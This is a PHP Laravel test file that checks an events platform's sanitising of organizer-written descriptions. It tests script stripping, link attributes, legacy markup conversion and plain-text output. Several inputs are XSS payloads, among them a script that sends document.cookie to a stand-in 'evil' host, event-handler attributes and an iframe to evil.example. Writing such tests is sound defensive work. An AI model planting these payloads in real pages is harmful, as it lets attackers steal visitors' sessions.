<?php

namespace Tests\Feature;

use App\Enums\Role;
use App\Enums\TokenAbility;
use App\Models\Event;
use App\Models\Organization;
use App\Models\User;
use App\Support\RichText;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Str;
use Laravel\Sanctum\Sanctum;
use Tests\TestCase;

/**
 * Event descriptions: written by an organizer, read by a stranger, rendered
 * as markup.
 *
 * That last part is what makes this a security test as much as a formatting
 * one. A description is shown to every buyer who opens the link, so anything
 * that survives into the column survives into their browser.
 */
class EventDescriptionTest extends TestCase
{
    use RefreshDatabase;

    private Organization $org;

    protected function setUp(): void
    {
        parent::setUp();

        $this->org = Organization::create(['name' => 'Lagos Nights', 'slug' => 'lagos-nights']);
    }

    private function signedInAsOwner(): User
    {
        $user = User::factory()->create();

        $this->org->members()->attach($user->id, [
            'id' => (string) Str::uuid(),
            'role' => Role::Owner->value,
            'accepted_at' => now(),
        ]);

        Sanctum::actingAs($user->fresh()->load('organizations'), [
            TokenAbility::Attendee->value,
            TokenAbility::Organizer->value,
        ]);

        return $user;
    }

    private function event(?string $description): Event
    {
        return Event::create([
            'organization_id' => $this->org->id,
            'slug' => 'e-'.Str::random(8),
            'title' => 'Afrobeats Rooftop',
            'description' => $description,
            'currency' => 'CAD',
            'starts_at' => now()->addWeek(),
            'timezone' => 'America/Toronto',
            'city' => 'Toronto',
            'subdivision' => 'ON',
            'country' => 'CA',
            'status' => 'published',
        ]);
    }

    /** What is actually in the column, bypassing the model entirely. */
    private function stored(Event $event): ?string
    {
        return DB::table('events')->where('id', $event->id)->value('description');
    }

    public function test_script_never_reaches_the_column(): void
    {
        $event = $this->event('<p>Doors at nine</p><script>fetch("//evil/"+document.cookie)</script>');

        $this->assertSame('<p>Doors at nine</p>', $this->stored($event));
    }

    public function test_event_handlers_and_script_links_are_stripped(): void
    {
        $event = $this->event(
            '<p onmouseover="steal()">Hover</p>'
            .'<a href="javascript:alert(1)">tap</a>'
            .'<img src="x" onerror="alert(1)">'
        );

        $stored = $this->stored($event);

        $this->assertStringNotContainsString('onmouseover', $stored);
        $this->assertStringNotContainsString('javascript:', $stored);
        $this->assertStringNotContainsString('onerror', $stored);
        $this->assertStringNotContainsString('<img', $stored);
        $this->assertStringContainsString('Hover', $stored);
    }

    public function test_a_link_opens_away_from_the_event_page_and_passes_no_ranking(): void
    {
        $event = $this->event('<p>Tables: <a href="https://wa.me/2348000000000" style="color:red">WhatsApp us</a></p>');

        $stored = $this->stored($event);

        $this->assertStringContainsString('href="https://wa.me/2348000000000"', $stored);
        $this->assertStringContainsString('rel="noopener noreferrer nofollow"', $stored);
        $this->assertStringContainsString('target="_blank"', $stored);
        $this->assertStringNotContainsString('style=', $stored);
    }

    public function test_the_formatting_an_organizer_actually_uses_survives(): void
    {
        $html = '<h3>Lineup</h3><ul><li><strong>DJ Spinall</strong></li><li><em>Asake</em> (live)</li></ul>'
            .'<ol><li>Doors 9pm</li></ol><blockquote>Last year sold out in a day.</blockquote>';

        $this->assertSame($html, $this->stored($this->event($html)));
    }

    public function test_the_old_platforms_editor_markup_keeps_its_meaning(): void
    {
        // What the legacy WYSIWYG actually wrote: presentational tags and
        // styled wrappers. The emphasis is the organizer's; the wrappers are
        // the editor's.
        $event = $this->event('<div><b>Dress code:</b> <i>all white</i><br><span style="font-size:18px">No sneakers</span></div>');

        $stored = $this->stored($event);

        $this->assertStringContainsString('<strong>Dress code:</strong>', $stored);
        $this->assertStringContainsString('<em>all white</em>', $stored);
        $this->assertStringContainsString('No sneakers', $stored);
        $this->assertStringNotContainsString('<div', $stored);
        $this->assertStringNotContainsString('<span', $stored);
    }

    public function test_plain_text_keeps_the_organizers_paragraphs(): void
    {
        $event = $this->event("Doors at 9pm\nLate entry till 1am\n\nDress code: all white");

        $stored = $this->stored($event);

        // Two paragraphs, the single line break kept inside the first — and
        // escaped, so a stray "<" in plain text is a character, not markup.
        $this->assertSame(2, substr_count($stored, '<p>'));
        $this->assertStringContainsString('Late entry till 1am', $stored);

        $this->assertSame(
            '<p>5 &lt; 10</p>',
            $this->stored($this->event('5 < 10')),
        );
    }

    public function test_an_empty_editor_is_no_description_at_all(): void
    {
        // A WYSIWYG left blank saves an empty paragraph, which nobody wrote.
        $this->assertNull($this->stored($this->event('<p></p>')));
        $this->assertNull($this->stored($this->event('<p>&nbsp;</p><p><br></p>')));
        $this->assertNull($this->stored($this->event('   ')));
    }

    public function test_cleaning_clean_html_changes_nothing(): void
    {
        // The data migration and every re-save depend on this.
        $once = RichText::clean("Doors at 9pm\n\n<b>All white</b>");

        $this->assertSame($once, RichText::clean($once));
    }

    public function test_the_organizer_api_cannot_write_around_it(): void
    {
        $this->signedInAsOwner();
        $event = $this->event('<p>Before</p>');

        $this->patchJson("/api/organizer/events/{$event->id}", [
            'description' => '<p>After</p><iframe src="https://evil.example"></iframe>',
        ])->assertOk();

        $this->assertSame('<p>After</p>', $this->stored($event));
    }

    public function test_the_public_page_gets_markup_and_plain_words_separately(): void
    {
        $event = $this->event('<h3>Lineup</h3><p>Doors&nbsp;at <strong>9pm</strong></p>');

        $response = $this->getJson("/api/events/{$event->slug}")->assertOk();

        // &nbsp; comes back as the character itself, U+00A0 — same meaning,
        // one fewer entity for a client to decode.
        $this->assertSame("<h3>Lineup</h3><p>Doors\u{00A0}at <strong>9pm</strong></p>", $response->json('data.description'));

        // For meta tags and link previews, where markup would show as tags —
        // each block its own sentence, so the heading does not run into the
        // line under it.
        $this->assertSame('Lineup. Doors at 9pm', $response->json('data.description_text'));
    }

    /**
     * A list, as words.
     *
     * Its items were joined with a space, and an item rarely ends with a full
     * stop, so the link preview, the search snippet, the structured data and
     * the calendar entry all read "Photo ID may be requested Tickets are
     * transferable up to the day" as one sentence.
     */
    public function test_plain_words_keep_list_items_apart(): void
    {
        $event = $this->event('<p>Good to know</p><ul><li>Photo ID may be requested</li>'
            .'<li>Tickets are transferable up to the day</li><li>No re-entry!</li></ul><p>See you there.</p>');

        $text = $this->getJson("/api/events/{$event->slug}")->assertOk()->json('data.description_text');

        $this->assertSame(
            'Good to know. Photo ID may be requested. Tickets are transferable up to the day. No re-entry! See you there.',
            $text,
        );
        $this->assertSame($text, RichText::toText($event->description));
    }

    public function test_plain_words_leave_the_punctuation_the_organizer_typed(): void
    {
        $this->assertSame('Lineup: DJ Tunez, Wizkid', RichText::toText('<h3>Lineup:</h3><p>DJ Tunez, Wizkid</p>'));
        $this->assertSame('Doors at nine', RichText::toText('<p>Doors at nine</p>'));
        $this->assertNull(RichText::toText('<p>&nbsp;</p><p><br></p>'));
    }
}
